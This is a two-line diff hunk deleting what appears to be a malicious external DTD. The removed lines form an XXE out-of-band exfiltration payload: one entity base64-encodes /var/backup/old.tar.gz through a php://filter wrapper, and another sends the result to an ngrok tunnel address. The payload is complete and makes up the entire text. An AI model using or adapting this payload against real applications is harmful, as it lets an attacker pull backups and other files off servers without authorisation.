@@ -1,2 +1,0 @@
-<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/var/backup/old.tar.gz">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://6.tcp.eu.ngrok.io:13577/?x=%d;'>"> 
